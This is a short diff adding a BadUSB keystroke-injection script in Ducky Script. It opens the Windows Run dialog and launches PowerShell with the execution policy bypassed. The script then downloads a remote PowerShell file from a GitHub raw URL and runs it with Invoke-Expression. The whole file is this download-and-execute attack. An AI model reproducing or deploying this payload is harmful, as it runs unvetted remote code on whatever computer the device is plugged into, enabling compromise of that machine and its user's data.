@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Exec Bypass "$scriptContent = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wertsaco/badusb-test/refs/heads/main/QR%20to%20Console/main.ps1').Content; Invoke-Expression $scriptContent"
+ENTER
